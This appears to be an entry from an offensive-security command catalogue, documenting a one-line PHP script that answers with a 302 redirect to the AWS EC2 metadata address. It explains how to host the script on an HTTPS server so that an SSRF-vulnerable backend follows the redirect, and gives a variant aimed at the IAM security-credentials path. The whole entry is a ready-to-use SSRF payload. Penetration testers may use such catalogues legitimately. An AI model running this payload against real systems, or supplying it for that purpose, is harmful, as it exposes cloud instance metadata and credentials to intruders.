---
id: uuid-php-redirect
data: '<?php header(''Location: http://169.254.169.254/latest/meta-data/''); ?>'
tags:
  - ssrf
  - redirect
type: command
output: null
executor: php
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.736Z'
verified: false
validated: true
submitted: true
---
# php-redirect-to-aws-metadata

## Command

```php
<?php header('Location: http://169.254.169.254/latest/meta-data/'); ?>
```

## Description

This PHP script sends an HTTP 302 redirect to the AWS EC2 instance metadata service when accessed via a web request. It is used to bypass HTTPS-only restrictions in SSRF-vulnerable endpoints by hosting on an HTTPS server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Location` | The redirect URL (http://169.254.169.254/latest/meta-data/) | Yes |

## Examples

### Basic Usage

Save as slpoc.php and host on HTTPS server. Access https://mydomain/slpoc.php to trigger redirect.

### Advanced Usage

Modify Location for other internal endpoints, e.g., header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/');

## Expected Output

When fetched, returns HTTP 302 with Location header pointing to AWS metadata, causing the client (e.g., backend) to follow and retrieve listing like 'ami-id ami-launch-index ... security-groups'.

## Related

- [[procedures/Host-Redirecting-PHP-File-for-Bypass]]
- [[procedures/Execute-SSRF-to-Retrieve-AWS-Metadata]]
